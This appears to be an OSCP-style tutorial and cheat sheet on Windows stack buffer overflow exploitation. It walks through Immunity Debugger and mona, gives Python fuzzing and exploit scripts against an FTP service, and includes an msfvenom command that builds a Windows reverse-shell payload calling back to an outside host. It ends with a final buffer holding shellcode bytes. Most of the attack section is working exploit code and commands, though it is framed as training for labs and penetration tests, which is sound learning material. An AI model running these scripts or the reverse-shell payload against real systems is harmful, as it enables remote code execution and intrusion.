# Buffer Overflows - Windows

## Immunity Debugger

Always run the Immunity Debugger as an **Administrator** if possible.

When Immunity Debugger is open you have two options to connect to the application to debug, which are:

1.  Use `File | Attach` and select the running process; or
2.  Use `File | Open` and from the file menu select the application to run

Once you have opened or selected the application the application will be paused.  Click the "Run" button or press F9.

**NOTE:**  If the binary that is being debugged is a Windows service, you may need to restart the application using `sc` e.g.

```
sc stop SLmail
sc start SLmail
```

Some applications are configured to be started from the Service Manager and will not work unless they are started by Service Control.

## Mona Setup

Mona is a powerful plugin for the Immunity Debugger that will assist in exploiting buffer overflows and the latest version can be downloaded from [https://github.com/corelan/mona](https://github.com/corelan/mona)

The manual for Mona can be found at [https://www.corelan.be/index.php/2011/07/14/mona-py-the-manual/](https://www.corelan.be/index.php/2011/07/14/mona-py-the-manual/)

Once you have downloaded `mona.py` you need to move it into the PyCommands directory in Immunity Debugger which by default is located in `c:\Program Files\Immunity Inc\Immunity Debugger\PyCommands`

To set the working directory for Immunity Debugger, type the following command in the command bar at the bottom of the windows `!mona config -set workingfolder c:\mona\%p`

## Fuzzing

To see if an application is suspectible to a buffer overflow, you fuzz remote entry points with increasingly long buffer strings with the hope that it will eventually crash the application.  The following Python script can be modified to fuzz remote entry points:

```Python
import socket, time, sys

ip = "10.0.0.1"
port = 21
timeout = 5

# Create an array of increasing length buffer strings.
buffer = []
counter = 100
while len(buffer) < 30:
    buffer.append("A" * counter)
    counter += 100

for string in buffer:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        connect = s.connect((ip, port))
        s.recv(1024)
        s.send("USER username\r\n")
        s.recv(1024)

        print("Fuzzing PASS with %s bytes" % len(string))
        s.send("PASS " + string + "\r\n")
        s.recv(1024)
        s.send("QUIT\r\n")
        s.recv(1024)
        s.close()
    except:
        print("Could not connect to " + ip + ":" + str(port))
        sys.exit(0)
    time.sleep(1)
```
In Immunity Debugger check that the EIP Register has been overwritten with "A's" (\x41) also making note of any other registers that have been overwritten, or are pointing to a space in memory which has been overwritten.

## Crash Replication and Controlling the EIP

The following exploit can be used as a basis for the rest of the buffer overflow exploit chain
```Python
import socket

ip = "10.0.0.1"
port = 21

prefix = ""
offset = 0
overflow = "A" * offset
retn = ""		#Note when entering the address for the JMP ESP if the system is Little Endian it is written backwards
padding = ""

# Note when entering in bad characters when copying from !mona bytearray -b "\x00" make sure that you enclose it in brackets in the payload variable.

payload =  ""
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
	s.connect((ip, port))
	print("Send evil buffer...")
	s.send(buffer + "\r\n")
	print("Done!")

except:
	print("Could not connect.")
```
Using the buffer length which caused the crash, generate a unique buffer so we can determine the offset in the pattern which overwrites the EIP register, and the offset in the pattern to which other registers point. Create a pattern that is 400 bytes larger than the crash buffer, so that we can determine whether our shellcode can fit immediately. If the larger buffer doesn't crash the application, use a pattern equal to the crash buffer length and slowly add more to the buffer to find space.

```
$ /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 600
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
```

While the unique buffer is on the stack, use mona's findmsp command, with the distance argument set to the pattern length.

```
!mona findmsp -distance 600
...
[+] Looking for cyclic pattern in memory
Cyclic pattern (normal) found at 0x005f3614 (length 600 bytes)
Cyclic pattern (normal) found at 0x005f4a40 (length 600 bytes)
Cyclic pattern (normal) found at 0x017df764 (length 600 bytes)
EIP contains normal pattern : 0x78413778 (offset 112)
ESP (0x017dfa30) points at offset 116 in normal pattern (length 484)
EAX (0x017df764) points at offset 0 in normal pattern (length 600)
EBP contains normal pattern : 0x41367841 (offset 108)
...
```
An alternative to find the EIP Offset is to use `pattern_offset.rb` with the length and EIP Address

```
$ /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 600 -q <EIP>
[+] Exact match found at offset 112
```

Note the EIP offset (112) and any other registers that point to the pattern, noting their offsets as well. It seems like the ESP register points to the last 484 bytes of the pattern, which is enough space for our shellcode.

Create a new buffer using this information to ensure that we can control EIP.

```Python
prefix = ""
offset = 112
overflow = "A" * offset
retn = "BBBB"
padding = ""
payload = "C" * (600-112-4)
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix
```
Crash the application using this buffer, and make sure that EIP is overwritten by B's (\x42) and that the ESP register points to the start of the C's (\x43).

**NOTE:** If you are doing this as part of an Active Pen Test or a certification exam e.g. OSCP, it is recommended to have multiple copies that you modify during each stage so you can include these as part of the overall report. 

## Finding Bad Characters

Generate a bytearray using mona, and exclude the null byte (\x00) by default. Note the location of the bytearray.bin file that is generated.  

`!mona bytearray -b "\x00"`


Put the string of bad chars into your payload variable in the script and crash the application using this buffer, and make a note of the address to which ESP points. You can get a copy of the payload from the `bytearray` file that is in your working directory and this is updated each time you run the above command with additional bad characters.

**NOTE:**  The ESP can change every time you crash the application, so get into the habit of copying it from the register each time.

Use the mona compare command to reference the bytearray you generated, and the address to which ESP points:

`!mona compare -f C:\mona\appname\bytearray.bin -a <address>`

Repeat this process until you have excluded all bad characters and make note of this as you will use it later when generating the payload.


## Find a Jump Point

The mona jmp command can be used to search for jmp (or equivalent) instructions to a specific register. The jmp command will, by default, ignore any modules that are marked as aslr or rebase.

The following example searches for "jmp esp" or equivalent (e.g. call esp, push esp; retn, etc.) while ensuring that the address of the instruction doesn't contain the bad chars \x00, \x0a, and \x0d.

`!mona jmp -r esp -cpb "\x00\x0a\x0d"`

The mona find command can similarly be used to find specific instructions, though for the most part, the jmp command is sufficient:

`!mona find -s 'jmp esp' -type instr -cm aslr=false,rebase=false,nx=false -cpb "\x00\x0a\x0d"`


## Generate Payload

Generate a reverse shell payload using msfvenom, making sure to exclude the same bad chars that were found previously:

`msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.92 LPORT=9001 EXITFUNC=thread -b "\x00\x0a\x0d" -f c -v payload`

I also have used the output format as py and use the `-v` to set the variable name to payload so that I don't have to modify my script further


## Prepend NOPs

If an encoder was used (more than likely if bad chars are present, remember to prepend at least 16 NOPs (\x90) to the payload.

## Final Buffer

```Python
prefix = ""
offset = 112
overflow = "A" * offset
retn = "\x56\x23\x43\x9A"
padding = "\x90" * 16
payload = b""
payload += b"\xbe\x9d\xba\xa5\x81\xda\xd0\xd9\x74\x24\xf4\x5f"
payload += b"\x31\xc9\xb1\x52\x83\xef\xfc\x31\x77\x0e\x03\xea"
payload += b"\xb4\x47\x74\xe8\x21\x05\x77\x10\xb2\x6a\xf1\xf5"
payload += b"\x83\xaa\x65\x7e\xb3\x1a\xed\xd2\x38\xd0\xa3\xc6"
payload += b"\xcb\x94\x6b\xe9\x7c\x12\x4a\xc4\x7d\x0f\xae\x47"
payload += b"\xfe\x52\xe3\xa7\x3f\x9d\xf6\xa6\x78\xc0\xfb\xfa"
payload += b"\xd1\x8e\xae\xea\x56\xda\x72\x81\x25\xca\xf2\x76"
payload += b"\xfd\xed\xd3\x29\x75\xb4\xf3\xc8\x5a\xcc\xbd\xd2"
payload += b"\xbf\xe9\x74\x69\x0b\x85\x86\xbb\x45\x66\x24\x82" 
...
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

```

## Further Reading

- [https://johntroony.medium.com/a-practical-overview-of-stack-based-buffer-overflow-7572eaaa4982](https://johntroony.medium.com/a-practical-overview-of-stack-based-buffer-overflow-7572eaaa4982)
- [https://www.abatchy.com/2017/05/jumping-to-shellcode.html](https://www.abatchy.com/2017/05/jumping-to-shellcode.html)

## Buffer Overflow Practice

- [https://github.com/justinsteven/dostackbufferoverflowgood](https://github.com/justinsteven/dostackbufferoverflowgood)
- [https://github.com/stephenbradshaw/vulnserver](https://github.com/stephenbradshaw/vulnserver)
- [https://www.vortex.id.au/2017/05/pwkoscp-stack-buffer-overflow-practice/](https://www.vortex.id.au/2017/05/pwkoscp-stack-buffer-overflow-practice/)
- [Try Hack Me](http://www.tryhackme.com)
- [Hack the Box](http://www.hackthebox.eu)
